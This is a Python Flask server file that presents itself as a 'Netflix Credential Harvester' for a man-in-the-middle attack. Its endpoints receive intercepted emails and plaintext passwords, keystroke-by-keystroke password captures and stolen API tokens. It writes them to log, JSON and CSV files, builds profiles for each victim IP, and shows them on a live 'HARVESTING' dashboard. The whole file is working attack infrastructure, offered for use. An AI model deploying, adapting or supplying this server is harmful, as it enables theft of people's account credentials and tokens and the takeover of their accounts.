#!/usr/bin/env python3
"""
Netflix Credential Harvester Server
Receives and logs intercepted credentials from MITM attack

Listens for:
1. Form submissions with captured credentials
2. Real-time keystroke logging
3. API token interception
4. Authentication attempts
"""

import json
import logging
import os
import time
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_cors import CORS

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('/app/logs/harvester.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

app = Flask(__name__)
CORS(app)

# In-memory storage of harvested credentials
harvested_credentials = {
    'credentials': [],
    'keystrokes': [],
    'api_tokens': [],
    'sessions': []
}


@app.route('/harvest', methods=['POST', 'OPTIONS'])
def harvest_credentials():
    """
    Endpoint to receive harvested credentials from MITM injected payload

    Expects JSON:
    {
        "url": "https://netflix.com/signup",
        "timestamp": "2026-08-04T...",
        "credentials": {
            "email": "user@example.com",
            "password": "plaintext_password"
        },
        "userAgent": "Mozilla/5.0..."
    }
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()

        if not data:
            return jsonify({'status': 'error', 'message': 'No data provided'}), 400

        logger.warning("=" * 80)
        logger.warning("[!] 🚨 CREDENTIALS HARVESTED - REAL DATA CAPTURED 🚨")
        logger.warning("=" * 80)

        # Log the harvested data
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'url': data.get('url', 'unknown'),
            'user_agent': data.get('userAgent', 'unknown'),
            'credentials': data.get('credentials', {}),
            'client_ip': request.remote_addr
        }

        logger.warning(f"[HARVEST] URL: {log_entry['url']}")
        logger.warning(f"[HARVEST] IP: {log_entry['client_ip']}")
        logger.warning(f"[HARVEST] User-Agent: {log_entry['user_agent']}")
        logger.warning("")

        # Print each credential with clear formatting
        cred_count = len(log_entry['credentials'])
        logger.critical(f"[CREDENTIALS] Captured {cred_count} fields:")
        logger.critical("+" * 78)

        for idx, (field, value) in enumerate(log_entry['credentials'].items(), 1):
            field_upper = field.upper()
            logger.critical(f"  [{idx}] {field_upper}")
            logger.critical(f"      └─ {value}")

        logger.critical("+" * 78)

        harvested_credentials['credentials'].append(log_entry)

        # Write to detailed log file
        with open('/app/logs/harvested_credentials.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

        # Also write CSV format for easy analysis
        with open('/app/logs/harvested_credentials.csv', 'a') as f:
            creds_str = '|'.join([f"{k}={v}" for k, v in log_entry['credentials'].items()])
            f.write(f"{log_entry['timestamp']},{log_entry['url']},{log_entry['client_ip']},{creds_str}\n")

        logger.info(f"[SUCCESS] Logged {len(log_entry['credentials'])} credential fields")

        return jsonify({
            'status': 'success',
            'message': 'Credentials harvested successfully',
            'id': len(harvested_credentials['credentials'])
        }), 200

    except Exception as e:
        logger.error(f"[ERROR] Failed to harvest credentials: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/log_keystroke', methods=['POST', 'OPTIONS'])
def log_keystroke():
    """
    Real-time keystroke logging endpoint

    Captures password as it's being typed character by character
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        # Force parse as JSON regardless of Content-Type
        data = request.get_json(force=True)

        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'keystroke': data.get('keystroke', ''),
            'client_ip': request.remote_addr
        }

        harvested_credentials['keystrokes'].append(log_entry)

        logger.warning(f"[KEYSTROKE] Partial password: {log_entry['keystroke']}")

        # Write to keystroke log
        with open('/app/logs/keystrokes.log', 'a') as f:
            f.write(f"{log_entry['timestamp']} - {log_entry['keystroke']}\n")

        return jsonify({'status': 'success'}), 200

    except Exception as e:
        logger.error(f"[ERROR] Keystroke logging failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/api_token', methods=['POST', 'OPTIONS'])
def capture_api_token():
    """
    Endpoint to capture leaked API tokens and authentication tokens
    """
    if request.method == 'OPTIONS':
        return '', 204

    try:
        data = request.get_json()

        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'token': data.get('token', ''),
            'token_type': data.get('type', 'unknown'),
            'source_url': data.get('url', ''),
            'client_ip': request.remote_addr
        }

        harvested_credentials['api_tokens'].append(log_entry)

        logger.critical(f"[TOKEN] Type: {log_entry['token_type']}")
        logger.critical(f"[TOKEN] Value: {log_entry['token'][:50]}...")

        with open('/app/logs/api_tokens.json', 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

        return jsonify({'status': 'success'}), 200

    except Exception as e:
        logger.error(f"[ERROR] Token capture failed: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500


@app.route('/stats', methods=['GET'])
def get_statistics():
    """
    Get statistics about harvested data
    Shows both real and total counts (real = filtered to login credentials only)
    """
    # Filter to real login credentials
    real_creds = [
        c for c in harvested_credentials['credentials']
        if c.get('credentials') and  # Must have actual credentials dict
           not any(x in c.get('url', '').lower() for x in ['/log/', '/logging', '/analytics']) and
           c.get('url', '').lower().count('login') > 0  # Must be from login endpoint
    ]

    stats = {
        'timestamp': datetime.now().isoformat(),
        'total_credentials': len(harvested_credentials['credentials']),
        'real_credentials': len(real_creds),  # Filtered to actual login attempts
        'total_keystrokes': len(harvested_credentials['keystrokes']),
        'total_tokens': len(harvested_credentials['api_tokens']),
        'latest_credential': real_creds[-1] if real_creds else None
    }

    return jsonify(stats), 200


@app.route('/get_credentials', methods=['GET'])
def get_all_credentials():
    """
    Get all harvested credentials for dashboard display
    Filters out false positives (logging endpoints) and shows only real credentials
    """
    # Filter out fake credentials from logging endpoints
    real_creds = [
        c for c in harvested_credentials['credentials']
        if c.get('credentials') and  # Must have actual credentials dict
           not any(x in c.get('url', '').lower() for x in ['/log/', '/logging', '/analytics']) and
           c.get('url', '').lower().count('login') > 0  # Must be from login endpoint
    ]

    return jsonify({
        'credentials': real_creds,
        'keystrokes': harvested_credentials['keystrokes'],
        'tokens': harvested_credentials['api_tokens'],
        'real_count': len(real_creds),
        'total_count': len(harvested_credentials['credentials'])
    }), 200


@app.route('/api/credentials', methods=['GET'])
def api_credentials_organized():
    """
    API endpoint returning organized credential profiles
    Groups related credentials by IP and progressively builds profiles
    """
    # Group credentials by IP
    ip_groups = {}
    for cred in harvested_credentials['credentials']:
        ip = cred.get('client_ip', 'unknown')
        if ip not in ip_groups:
            ip_groups[ip] = {
                'ip': ip,
                'profiles': [],
                'all_fields': {}
            }

        # Merge credentials into all_fields
        cred_fields = cred.get('credentials', {})
        ip_groups[ip]['all_fields'].update(cred_fields)

        # Group by capture timestamp (rough grouping for profile building)
        ts = cred.get('timestamp', '').split('T')[0] if cred.get('timestamp') else 'unknown'
        profile_exists = False
        for profile in ip_groups[ip]['profiles']:
            if profile['date'] == ts:
                profile['fields'].update(cred_fields)
                profile['count'] += 1
                profile_exists = True
                break

        if not profile_exists:
            ip_groups[ip]['profiles'].append({
                'date': ts,
                'fields': cred_fields.copy(),
                'count': 1,
                'first_seen': cred.get('timestamp', ''),
                'all_captured_fields': list(cred_fields.keys())
            })

    # Format for response
    result = []
    for ip, data in ip_groups.items():
        result.append({
            'ip': ip,
            'profile_count': len(data['profiles']),
            'complete_profile': data['all_fields'],
            'profiles': data['profiles'],
            'fields_captured': sorted(set(sum([p['all_captured_fields'] for p in data['profiles']], [])))
        })

    return jsonify({
        'status': 'success',
        'total_ips': len(ip_groups),
        'total_captures': len(harvested_credentials['credentials']),
        'device_profiles': result
    }), 200


@app.route('/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    return jsonify({'status': 'healthy', 'service': 'Netflix Credential Harvester'}), 200


@app.route('/', methods=['GET'])
def index():
    """Dashboard showing harvested data - LIVE UPDATING"""
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Netflix Credential Harvester Dashboard</title>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body {
                font-family: 'Courier New', monospace;
                background: #0a0e27;
                color: #00ff00;
                padding: 20px;
                line-height: 1.6;
            }
            .container {
                max-width: 1400px;
                margin: 0 auto;
            }
            h1 {
                text-align: center;
                color: #ff0000;
                margin-bottom: 20px;
                text-shadow: 0 0 10px #ff0000;
                font-size: 2.5em;
            }
            h2 {
                color: #00ff00;
                margin-top: 20px;
                margin-bottom: 10px;
                border-bottom: 2px solid #00ff00;
                padding-bottom: 5px;
            }
            .grid {
                display: grid;
                grid-template-columns: 1fr 1fr 1fr;
                gap: 20px;
                margin-bottom: 30px;
            }
            .stat-box {
                background: #1a1f3a;
                border: 2px solid #00ff00;
                padding: 20px;
                border-radius: 5px;
            }
            .stat-number {
                font-size: 2.5em;
                color: #ff00ff;
                text-align: center;
                font-weight: bold;
            }
            .stat-label {
                text-align: center;
                color: #00ff00;
                margin-top: 10px;
            }
            .credentials-section {
                background: #1a1f3a;
                border: 2px solid #00ff00;
                padding: 20px;
                margin-bottom: 20px;
                border-radius: 5px;
            }
            .credential {
                background: #2a1f3a;
                padding: 15px;
                margin: 10px 0;
                border-left: 4px solid #ff0000;
                border-radius: 3px;
                animation: slideIn 0.5s ease-in;
            }
            @keyframes slideIn {
                from {
                    opacity: 0;
                    transform: translateX(-20px);
                }
                to {
                    opacity: 1;
                    transform: translateX(0);
                }
            }
            .credential-field {
                display: flex;
                justify-content: space-between;
                margin: 5px 0;
                padding: 5px;
                background: #1a1f3a;
                border-radius: 3px;
            }
            .field-name {
                color: #00ffff;
                font-weight: bold;
                min-width: 120px;
            }
            .field-value {
                color: #ffff00;
                word-break: break-all;
                flex: 1;
                margin-left: 10px;
            }
            .field-value.password {
                color: #ff0099;
                font-weight: bold;
            }
            .field-value.email {
                color: #00ff99;
                font-weight: bold;
            }
            .keystroke-display {
                margin: 8px 0;
                padding: 8px;
                background: #1a1a2e;
                border-left: 3px solid #ff1744;
                border-radius: 4px;
            }
            .keystroke-display .field-value {
                display: block;
                margin-top: 6px;
                font-family: 'Courier New', monospace;
                letter-spacing: 1px;
            }
            .timestamp {
                font-size: 0.9em;
                color: #999;
                margin-bottom: 10px;
            }
            .url {
                font-size: 0.9em;
                color: #0099ff;
                margin-bottom: 10px;
            }
            .ip-address {
                font-size: 0.9em;
                color: #ff9900;
                margin-bottom: 10px;
            }
            .refresh-info {
                text-align: center;
                color: #666;
                margin-top: 20px;
                font-size: 0.85em;
            }
            .status-badge {
                display: inline-block;
                padding: 5px 10px;
                border-radius: 3px;
                margin-left: 10px;
            }
            .status-active {
                background: #00ff00;
                color: #000;
            }
            .empty-message {
                text-align: center;
                color: #666;
                padding: 40px;
                font-style: italic;
            }
            .attack-indicator {
                text-align: center;
                font-size: 3em;
                animation: pulse 2s infinite;
            }
            @keyframes pulse {
                0% { opacity: 1; }
                50% { opacity: 0.5; }
                100% { opacity: 1; }
            }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🎯 NETFLIX MITM ATTACK - LIVE DASHBOARD
                <span class="status-badge status-active">HARVESTING</span>
            </h1>

            <div class="grid">
                <div class="stat-box">
                    <div class="stat-number" id="cred-count">0</div>
                    <div class="stat-label">Credentials Captured</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="keystroke-count">0</div>
                    <div class="stat-label">Keystrokes Logged</div>
                </div>
                <div class="stat-box">
                    <div class="stat-number" id="token-count">0</div>
                    <div class="stat-label">API Tokens Stolen</div>
                </div>
            </div>

            <div class="credentials-section">
                <h2>🔓 LIVE CREDENTIAL CAPTURE</h2>
                <div id="credentials-container">
                    <div class="empty-message">Waiting for credentials to be harvested...</div>
                </div>
            </div>

            <div class="credentials-section">
                <h2>⌨️ KEYSTROKE LOG</h2>
                <div id="keystrokes-container">
                    <div class="empty-message">Loading keystrokes...</div>
                </div>
            </div>

            <div class="refresh-info">
                ⟳ Dashboard updates every 2 seconds | Last update: <span id="last-update">-</span>
            </div>
        </div>

        <script>
            const POLL_INTERVAL = 2000; // Update every 2 seconds

            function formatField(key, value) {
                const keyLower = key.toLowerCase();
                let className = '';

                if (keyLower.includes('password')) {
                    className = 'password';
                } else if (keyLower.includes('email')) {
                    className = 'email';
                }

                return `
                    <div class="credential-field">
                        <span class="field-name">${key}:</span>
                        <span class="field-value ${className}">${escapeHtml(value)}</span>
                    </div>
                `;
            }

            function escapeHtml(text) {
                const map = {
                    '&': '&amp;',
                    '<': '&lt;',
                    '>': '&gt;',
                    '"': '&quot;',
                    "'": '&#039;'
                };
                return text.replace(/[&<>"']/g, m => map[m]);
            }

            function updateDashboard() {
                fetch('/stats')
                    .then(r => r.json())
                    .then(data => {
                        // Update stat counters (show real credentials, not false positives)
                        document.getElementById('cred-count').textContent = data.real_credentials;
                        document.getElementById('keystroke-count').textContent = data.total_keystrokes;
                        document.getElementById('token-count').textContent = data.total_tokens;

                        // Update last update time
                        const now = new Date();
                        document.getElementById('last-update').textContent =
                            now.toLocaleTimeString();

                        // Always fetch full data (for both credentials and keystrokes)
                        return fetch('/get_credentials');
                    })
                    .then(r => r ? r.json() : null)
                    .then(data => {
                        if (!data) return;

                        const container = document.getElementById('credentials-container');

                        // Display credentials
                        if (!data.credentials || data.credentials.length === 0) {
                            container.innerHTML = '<div class="empty-message">No credentials captured yet</div>';
                        } else {

                            // Display latest credentials (most recent first)
                            const html = data.credentials
                                .reverse()
                                .slice(0, 20)  // Show last 20
                                .map((cred, idx) => {
                                    const time = new Date(cred.timestamp);
                                    return `
                                        <div class="credential" style="animation-delay: ${idx * 0.05}s">
                                            <div class="timestamp">📅 ${time.toLocaleString()}</div>
                                            <div class="url">🌐 ${escapeHtml(cred.url)}</div>
                                            <div class="ip-address">📍 Source: ${cred.client_ip}</div>
                                            <div style="margin-top: 10px; padding-top: 10px; border-top: 1px solid #444;">
                                                ${Object.entries(cred.credentials)
                                                    .map(([key, value]) => formatField(key, value))
                                                    .join('')}
                                            </div>
                                        </div>
                                    `;
                                })
                                .join('');

                            container.innerHTML = html;
                        }

                        // Also update keystrokes display
                        const keystrokesContainer = document.getElementById('keystrokes-container');
                        console.log('[DASHBOARD] Keystrokes data:', data.keystrokes ? data.keystrokes.length : 0);
                        if (data.keystrokes && data.keystrokes.length > 0) {
                            keystrokesContainer.style.display = 'block';
                            console.log('[DASHBOARD] Showing keystrokes container');

                            const keystrokeHtml = data.keystrokes
                                .reverse()
                                .slice(0, 100)  // Show last 100
                                .map((ks, idx) => {
                                    try {
                                        const ts = ks.timestamp ? new Date(ks.timestamp).toLocaleString() : 'unknown';
                                        return `
                                            <div class="credential" style="animation-delay: ${idx * 0.02}s">
                                                <div class="timestamp">📅 ${ts}</div>
                                                <div class="keystroke-display">
                                                    <span class="field-name">🔤 Input:</span>
                                                    <span class="field-value password">${escapeHtml(ks.keystroke || '')}</span>
                                                </div>
                                                <div class="ip-address">📍 ${ks.client_ip || 'unknown'}</div>
                                            </div>
                                        `;
                                    } catch(e) {
                                        console.error('Keystroke render error:', e);
                                        return '';
                                    }
                                })
                                .join('');

                            keystrokesContainer.innerHTML = keystrokeHtml || '<div class="empty-message">Error displaying keystrokes</div>';
                        } else {
                            keystrokesContainer.innerHTML = '<div class="empty-message">No keystrokes captured yet</div>';
                        }
                    })
                    .catch(err => {
                        console.error('Update error:', err);
                    });
            }

            // Initial update
            updateDashboard();

            // Set up polling
            setInterval(updateDashboard, POLL_INTERVAL);

            // Also update when page becomes visible
            document.addEventListener('visibilitychange', () => {
                if (!document.hidden) {
                    updateDashboard();
                }
            });
        </script>
    </body>
    </html>
    """
    return html, 200


if __name__ == '__main__':
    # Create logs directory if it doesn't exist
    os.makedirs('/app/logs', exist_ok=True)

    logger.info("=" * 80)
    logger.info("Netflix Credential Harvester Server Started")
    logger.info("Listening for MITM injected payloads...")
    logger.info("=" * 80)

    app.run(host='0.0.0.0', port=8888, debug=False)
